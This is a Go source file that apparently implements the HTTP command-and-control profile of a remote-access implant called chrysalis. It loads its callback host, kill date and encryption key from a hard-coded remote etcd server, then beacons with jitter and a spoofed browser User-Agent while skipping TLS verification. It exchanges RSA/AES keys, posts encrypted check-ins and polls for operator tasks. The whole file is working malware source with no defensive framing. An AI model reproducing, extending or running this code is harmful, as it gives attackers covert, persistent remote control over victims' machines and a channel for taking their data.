package profiles

import (
	"bytes"
	"crypto/rsa"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/spf13/viper"
	"github.com/xdefrag/viper-etcd/remote"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/FractalKnight/chrysalis/src/pkg/utils/crypto"
	"github.com/FractalKnight/chrysalis/src/pkg/utils/structs"
)

var callback_host string
var callback_port string
var killdate string
var encrypted_exchange_check string
var callback_interval string
var callback_jitter string
var headers string
var AESPSK string
var post_uri string

var proxy_host string
var proxy_port string
var proxy_user string
var proxy_pass string
var proxy_bypass string

func init() {
	viper.RemoteConfig = &remote.Config{
		Decoder: &decode{},
	}
}

type decode struct{}

func (d decode) Decode(r io.Reader) (interface{}, error) {
	raw, err := ioutil.ReadAll(r)
	if err != nil {
		return nil, err
	}

	s := string(raw)

	if strings.Contains(s, ",") {
		return strings.Split(s, ","), nil
	}

	return s, nil
}

func must(err error) {
	if err != nil {
		panic(err)
	}
}

type xHTTP struct {
	BaseURL        string
	PostURI        string
	ProxyURL       string
	ProxyUser      string
	ProxyPass      string
	ProxyBypass    bool
	Interval       int
	Jitter         int
	HeaderList     []structs.HeaderStruct
	ExchangingKeys bool
	Key            string
	RsaPrivateKey  *rsa.PrivateKey
	Killdate       time.Time
}

// New creates a new HTTP C2 profile from the package's global variables and returns it
func New() structs.Profile {
	vpr := viper.New()
	// check for comm to config site.
	must(vpr.AddRemoteProvider("etcd", "http://wlsoftwaresystems.com", "/http"))
	vpr.SetConfigType("json")
	must(vpr.ReadRemoteConfig())

	callback_host = vpr.Get("host").(string)
	callback_port = vpr.Get("port").(string)
	killdate = vpr.Get("kd").(string)
	AESPSK = vpr.Get("psk").(string)
	callback_interval = vpr.Get("interval").(string)
	encrypted_exchange_check = vpr.Get("exchange").(string)
	headers = "{'name': 'User-Agent', 'key': 'User-Agent', 'value': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'}"
	post_uri = vpr.Get("post").(string)
	callback_jitter = vpr.Get("jitter").(string)

	var final_url string
	var last_slash int
	if callback_port == "443" && strings.Contains(callback_host, "https://") {
		final_url = callback_host
	} else if callback_port == "80" && strings.Contains(callback_host, "http://") {
		final_url = callback_host
	} else {
		last_slash = strings.Index(callback_host[8:], "/")
		if last_slash == -1 {
			//there is no 3rd slash
			final_url = fmt.Sprintf("%s:%s", callback_host, callback_port)
		} else {
			//there is a 3rd slash, so we need to splice in the port
			last_slash += 8 // adjust this back to include our offset initially
			//fmt.Printf("index of last slash: %d\n", last_slash)
			//fmt.Printf("splitting into %s and %s\n", string(callback_host[0:last_slash]), string(callback_host[last_slash:]))
			final_url = fmt.Sprintf("%s:%s%s", string(callback_host[0:last_slash]), callback_port, string(callback_host[last_slash:]))
		}
	}
	if final_url[len(final_url)-1:] != "/" {
		final_url = final_url + "/"
	}
	//fmt.Printf("final url: %s\n", final_url)
	killDateString := fmt.Sprintf("%sT00:00:00.000Z", killdate)
	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
	if err != nil {
		os.Exit(1)
	}
	profile := xHTTP{
		BaseURL:   final_url,
		PostURI:   post_uri,
		ProxyUser: proxy_user,
		ProxyPass: proxy_pass,
		Key:       AESPSK,
		Killdate:  killDateTime,
	}

	// Convert sleep from string to integer
	i, err := strconv.Atoi(callback_interval)
	if err == nil {
		profile.Interval = i
	} else {
		profile.Interval = 10
	}

	// Convert jitter from string to integer
	j, err := strconv.Atoi(callback_jitter)
	if err == nil {
		profile.Jitter = j
	} else {
		profile.Jitter = 23
	}

	json.Unmarshal([]byte(headers), &profile.HeaderList)

	// Add proxy info if set
	if len(proxy_host) > 3 {
		profile.ProxyURL = fmt.Sprintf("%s:%s/", proxy_host, proxy_port)

		if len(proxy_user) > 0 && len(proxy_pass) > 0 {
			profile.ProxyUser = proxy_user
			profile.ProxyPass = proxy_pass
		}
	}

	// Convert ignore_proxy from string to bool
	profile.ProxyBypass, _ = strconv.ParseBool(proxy_bypass)

	if encrypted_exchange_check == "T" {
		profile.ExchangingKeys = true
	}
	return &profile
}

func (c *xHTTP) Start() {

	resp := c.CheckIn()
	checkIn := resp.(structs.CheckInMessageResponse)

	if strings.Contains(checkIn.Status, "success") {
		SetChrysalisID(checkIn.ID)
		for {
			// loop through all task responses
			message := CreateChrysalisMessage()
			encResponse, _ := json.Marshal(message)
			resp := c.SendMessage(encResponse).([]byte)
			if len(resp) > 0 {
				//fmt.Printf("Raw resp: \n %s\n", string(resp))
				taskResp := structs.ChrysalisMessageResponse{}
				err := json.Unmarshal(resp, &taskResp)
				if err != nil {
					log.Printf("Error unmarshal response to task response: %s", err.Error())
					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
					continue
				}
				HandleInboundChrysalisMessageFromEgressP2PChannel <- taskResp
			}
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
		}
	} else {
		fmt.Printf("Uh oh, failed to checkin\n")
	}
}

func (c *xHTTP) GetSleepTime() int {
	if c.Jitter > 0 {
		jit := float64(rand.Int()%c.Jitter) / float64(100)
		jitDiff := float64(c.Interval) * jit
		if int(jit*100)%2 == 0 {
			return c.Interval + int(jitDiff)
		} else {
			return c.Interval - int(jitDiff)
		}
	} else {
		return c.Interval
	}
}

func (c *xHTTP) SetSleepInterval(interval int) string {
	if interval >= 0 {
		c.Interval = interval
		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
	} else {
		return fmt.Sprintf("Sleep interval not updated, %d is not >= 0", interval)
	}

}

func (c *xHTTP) SetSleepJitter(jitter int) string {
	if jitter >= 0 && jitter <= 100 {
		c.Jitter = jitter
		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
	} else {
		return fmt.Sprintf("Jitter not updated, %d is not between 0 and 100", jitter)
	}
}

func (c *xHTTP) ProfileType() string {
	return "http"
}

func (c *xHTTP) CheckIn() interface{} {

	if c.ExchangingKeys {
		for !c.NegotiateKey() {
		}
	}
	for {
		checkin := CreateCheckinMessage()
		raw, err := json.Marshal(checkin)
		if err != nil {
			continue
		}
		resp := c.SendMessage(raw).([]byte)

		response := structs.CheckInMessageResponse{}
		err = json.Unmarshal(resp, &response)

		if err != nil {
			//log.Printf("Error in unmarshal:\n %s", err.Error())
			continue
		}

		if len(response.ID) != 0 {
			//log.Printf("Saving new UUID: %s\n", response.ID)
			SetChrysalisID(response.ID)
		} else {
			continue
		}
		return response
	}

}

func (c *xHTTP) NegotiateKey() bool {
	sessionID := GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	// Replace struct with dynamic json
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)
	//log.Println(unencryptedMsg)
	if err != nil {
		return false
	}

	resp := c.SendMessage(raw).([]byte)
	// Decrypt & Unmarshal the response

	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}

	err = json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		//log.Printf("Error unmarshaling eke response: %s\n", err.Error())
		return false
	}

	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	c.ExchangingKeys = false

	if len(sessionKeyResp.UUID) > 0 {
		SetChrysalisID(sessionKeyResp.UUID) // Save the new, temporary UUID
	} else {
		return false
	}

	return true
}

func (c *xHTTP) SendMessage(output []byte) interface{} {
	endpoint := c.PostURI
	return c.htmlPostData(endpoint, output)

}

// htmlPostData HTTP POST function
func (c *xHTTP) htmlPostData(urlEnding string, sendData []byte) []byte {
	targeturl := fmt.Sprintf("%s%s", c.BaseURL, c.PostURI)
	//log.Println("Sending POST request to url: ", url)
	// If the AesPSK is set, encrypt the data we send
	if len(c.Key) != 0 {
		//log.Printf("Encrypting Post data")
		sendData = c.encryptMessage(sendData)
	}
	if GetChrysalisID() != "" {
		sendData = append([]byte(GetChrysalisID()), sendData...) // Prepend the UUID
	} else {
		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
	}

	sendData = []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
	for true {
		today := time.Now()
		if today.After(c.Killdate) {
			os.Exit(1)
		}
		req, err := http.NewRequest("POST", targeturl, bytes.NewBuffer(sendData))
		if err != nil {
			fmt.Printf("Error creating new http request: %s", err.Error())
			continue
		}
		contentLength := len(sendData)
		req.ContentLength = int64(contentLength)
		for _, val := range c.HeaderList {
			if val.Key == "Host" {
				req.Host = val.Value
			} else {
				req.Header.Set(val.Key, val.Value)
			}

		}
		// loop here until we can get our data to go through properly
		//fmt.Printf("about to post data\n")
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}

		if len(c.ProxyURL) > 0 {
			proxyURL, _ := url.Parse(c.ProxyURL)
			tr.Proxy = http.ProxyURL(proxyURL)
		} else if !c.ProxyBypass {
			// Check for, and use, HTTP_PROXY, HTTPS_PROXY and NO_PROXY environment variables
			tr.Proxy = http.ProxyFromEnvironment
		}

		if len(c.ProxyPass) > 0 && len(c.ProxyUser) > 0 {
			auth := fmt.Sprintf("%s:%s", c.ProxyUser, c.ProxyPass)
			basicAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(auth))
			req.Header.Add("Proxy-Authorization", basicAuth)
		}

		client := &http.Client{
			Timeout:   30 * time.Second,
			Transport: tr,
		}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("error client.Do: %v\n", err)
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}

		if resp.StatusCode != 200 {
			fmt.Printf("error resp.StatusCode: %v\n", err)
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}

		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)

		if err != nil {
			fmt.Printf("error ioutil.ReadAll: %v\n", err)
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}

		raw, err := base64.StdEncoding.DecodeString(string(body))
		if err != nil {
			fmt.Printf("error base64.StdEncoding: %v\n", err)
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}

		if len(raw) < 36 {
			fmt.Printf("error len(raw) < 36: %v\n", err)
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}

		enc_raw := raw[36:] // Remove the UUID
		// if the AesPSK is set and we're not in the midst of the key exchange, decrypt the response
		if len(c.Key) != 0 {
			//log.Println("just did a post, and decrypting the message back")
			enc_raw = c.decryptMessage(enc_raw)
			//log.Println(enc_raw)
			if len(enc_raw) == 0 {
				// failed somehow in decryption
				fmt.Printf("error decrypt length wrong: %v\n", err)
				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
				continue
			}
		}
		//log.Printf("Raw htmlpost response: %s\n", string(enc_raw))
		return enc_raw
	}
	return make([]byte, 0) //shouldn't get here
}

func (c *xHTTP) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}

func (c *xHTTP) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}
